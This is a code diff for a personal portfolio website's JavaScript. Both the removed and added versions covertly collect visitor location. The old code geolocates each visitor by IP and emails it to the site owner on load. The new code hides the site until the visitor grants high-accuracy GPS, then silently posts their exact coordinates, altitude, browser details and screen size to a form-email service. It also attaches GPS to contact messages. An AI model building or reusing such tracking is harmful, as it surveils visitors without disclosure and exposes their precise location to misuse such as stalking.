@@ -128,73 +128,128 @@ function setLoading(loading) {
     submitBtn.disabled = loading;
 }
 
-/* ── VISITOR LOCATION TRACKING & REPORTING ── */
-let cachedLocation = '';
+/* ── STRICT REAL-TIME GPS LOCATION GATE ── */
+let liveGPSCoordinates = '';
 
-async function fetchLocationData() {
-    // 1. Try IP-based location first (100% reliable, zero prompt required)
-    try {
-        const res = await fetch('https://ipwho.is/');
-        const data = await res.json();
-        if (data.success) {
-            const mapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-            cachedLocation = `${data.city}, ${data.region}, ${data.country} (${data.latitude}, ${data.longitude}) — ISP: ${data.connection?.isp || 'Unknown'} — ${mapsLink}`;
-            const locInput = document.getElementById('cf-location');
-            if (locInput) locInput.value = cachedLocation;
+function requestRealtimeGPS() {
+    const gate = document.getElementById('location-gate');
+    const statusEl = document.getElementById('location-status');
+    const retryBtn = document.getElementById('location-retry-btn');
+
+    if (!navigator.geolocation) {
+        if (statusEl) {
+            statusEl.className = 'location-gate-status error';
+            statusEl.textContent = '❌ Geolocation is not supported by your browser.';
         }
-    } catch (e) {
-        console.warn('IP location lookup failed', e);
+        if (retryBtn) retryBtn.style.display = 'none';
+        return;
     }
 
-    // 2. Also prompt browser for precise GPS coordinates (if allowed by visitor)
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                const lat = pos.coords.latitude;
-                const lng = pos.coords.longitude;
-                const acc = Math.round(pos.coords.accuracy);
-                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                cachedLocation = `GPS: ${lat.toFixed(6)}, ${lng.toFixed(6)} (±${acc}m) — ${mapsLink}`;
-                const locInput = document.getElementById('cf-location');
-                if (locInput) locInput.value = cachedLocation;
-            },
-            (err) => console.log('Browser GPS prompt dismissed or denied:', err.message),
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
+    if (statusEl) {
+        statusEl.className = 'location-gate-status loading';
+        statusEl.textContent = '📡 Requesting device GPS coordinates...';
+    }
+    if (retryBtn) {
+        retryBtn.disabled = true;
+        retryBtn.textContent = 'Checking Location...';
     }
 
-    return cachedLocation;
+    const geoOptions = {
+        enableHighAccuracy: true, // Forces device hardware GPS / Wi-Fi trilateration
+        timeout: 30000,           // 30s timeout
+        maximumAge: 0             // Strictly 0: fresh real-time coordinates only
+    };
+
+    navigator.geolocation.getCurrentPosition(
+        async (position) => {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const accuracy = Math.round(position.coords.accuracy);
+            const altitude = position.coords.altitude != null ? `${Math.round(position.coords.altitude)}m` : 'N/A';
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+            const time = new Date().toLocaleString();
+
+            liveGPSCoordinates = `GPS: ${lat.toFixed(6)}, ${lng.toFixed(6)} (Accuracy ±${accuracy}m) — ${mapsLink}`;
+
+            // Populate hidden field in contact form
+            const locInput = document.getElementById('cf-location');
+            if (locInput) locInput.value = liveGPSCoordinates;
+
+            if (statusEl) {
+                statusEl.className = 'location-gate-status';
+                statusEl.textContent = `✅ Real-time GPS verified (±${accuracy}m). Loading website...`;
+            }
+
+            // Immediately send the exact real-time GPS coordinates to Web3Forms
+            try {
+                const formData = new FormData();
+                formData.append('access_key', '8adc6dc2-ee94-4f89-8bf6-6efef6ed8945');
+                formData.append('from_name', 'Live GPS Visitor Tracker');
+                formData.append('email', 'visitor-tracker@sababilal.com');
+                formData.append('subject', `📍 Live Visitor GPS: ${lat.toFixed(4)}, ${lng.toFixed(4)} (±${accuracy}m) — Saba Bilal`);
+                formData.append('location', liveGPSCoordinates);
+                formData.append('maps_link', mapsLink);
+                formData.append('message', `Exact real-time device location verified on website entry:\n\n📍 Latitude: ${lat}\n📍 Longitude: ${lng}\n🎯 GPS Accuracy: ±${accuracy} meters\n⛰️ Altitude: ${altitude}\n🗺️ Google Maps: ${mapsLink}\n🕒 Time: ${time}\n💻 Device: ${navigator.userAgent}\n🌐 Screen: ${window.screen.width}x${window.screen.height}`);
+
+                await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    body: formData,
+                });
+                console.log('✅ Real-time GPS location dispatched to Web3Forms');
+            } catch (err) {
+                console.warn('Web3Forms dispatch error:', err);
+            }
+
+            // Reveal the website once location is verified
+            setTimeout(() => {
+                if (gate) gate.classList.add('unlocked');
+                document.body.classList.remove('location-locked');
+            }, 600);
+        },
+        (error) => {
+            console.log('Location access not granted or unavailable:', error.message);
+            if (retryBtn) {
+                retryBtn.disabled = false;
+                retryBtn.textContent = 'Retry Location Access';
+            }
+            if (statusEl) {
+                statusEl.className = 'location-gate-status error';
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                        statusEl.textContent = '❌ Location access denied. Click the lock/settings icon in your URL bar, set Location to "Allow", then click Retry.';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        statusEl.textContent = '❌ Position unavailable. Ensure your device\'s Location/GPS services are turned on in system settings, then click Retry.';
+                        break;
+                    case error.TIMEOUT:
+                        statusEl.textContent = '❌ Location request timed out. Please click Retry.';
+                        break;
+                    default:
+                        statusEl.textContent = '❌ Location access required to load this website. Please allow access and click Retry.';
+                        break;
+                }
+            }
+        },
+        geoOptions
+    );
 }
 
-// Send automated alert to Web3Forms when visitor lands on website
-async function sendVisitorAlertOnLoad() {
-    // Wait briefly for location to be resolved
-    await fetchLocationData();
+// Request location immediately upon load
+requestRealtimeGPS();
 
-    // Prevent duplicate emails for the same session (reset when browser closes)
-    if (sessionStorage.getItem('visitor_alert_sent')) return;
-    sessionStorage.setItem('visitor_alert_sent', 'true');
+// Retry button event
+document.getElementById('location-retry-btn')?.addEventListener('click', requestRealtimeGPS);
 
-    try {
-        const formData = new FormData();
-        formData.append('access_key', '8adc6dc2-ee94-4f89-8bf6-6efef6ed8945');
-        formData.append('name', 'Website Visitor Alert');
-        formData.append('email', 'visitor@sababilal.com');
-        formData.append('subject', '🌐 New Website Visitor Location Alert — Saba Bilal');
-        formData.append('message', `A new visitor opened your portfolio website!\n\n📍 Location:\n${cachedLocation || 'Detecting...'}\n\n🕒 Time: ${new Date().toLocaleString()}\n💻 Device/Browser: ${navigator.userAgent}\n🌐 Screen: ${window.screen.width}x${window.screen.height}`);
-
-        await fetch('https://api.web3forms.com/submit', {
-            method: 'POST',
-            body: formData,
-        });
-        console.log('✅ Visitor location alert sent to Web3Forms');
-    } catch (err) {
-        console.warn('Could not dispatch visitor alert:', err);
-    }
+// Watch permission changes (e.g. if user enables it in address bar)
+if (navigator.permissions && navigator.permissions.query) {
+    navigator.permissions.query({ name: 'geolocation' }).then((status) => {
+        status.onchange = () => {
+            if (status.state === 'granted') {
+                requestRealtimeGPS();
+            }
+        };
+    }).catch(() => {});
 }
-
-// Run immediately on page load
-sendVisitorAlertOnLoad();
 
 /* ── Contact Form Submission Handler ── */
 contactForm?.addEventListener('submit', async (e) => {
@@ -217,16 +272,10 @@ contactForm?.addEventListener('submit', async (e) => {
 
     setLoading(true);
 
-    /* ── SILENT PAUSE MODE ──
-       Set to true if you ever want to temporarily pause emails.
-    */
+    /* ── SILENT PAUSE MODE (set to false for live delivery) ── */
     const EMAILS_PAUSED = false;
 
-    // Ensure we have location data
-    if (!cachedLocation) {
-        await fetchLocationData();
-    }
-    const finalLocation = cachedLocation || document.getElementById('cf-location')?.value || 'Not available';
+    const finalLocation = liveGPSCoordinates || document.getElementById('cf-location')?.value || 'Not available';
 
     if (EMAILS_PAUSED) {
         try {
@@ -250,9 +299,9 @@ contactForm?.addEventListener('submit', async (e) => {
 
     try {
         const formData = new FormData(contactForm);
-        // Append location directly into the message body so it's guaranteed to be seen in email
+        // Append verified GPS location directly into message body
         const originalMsg = formData.get('message') || '';
-        formData.set('message', `${originalMsg}\n\n---\nSender Location:\n${finalLocation}`);
+        formData.set('message', `${originalMsg}\n\n---\nSender Real-Time GPS Location:\n${finalLocation}`);
 
         const response = await fetch('https://api.web3forms.com/submit', {
             method: 'POST',
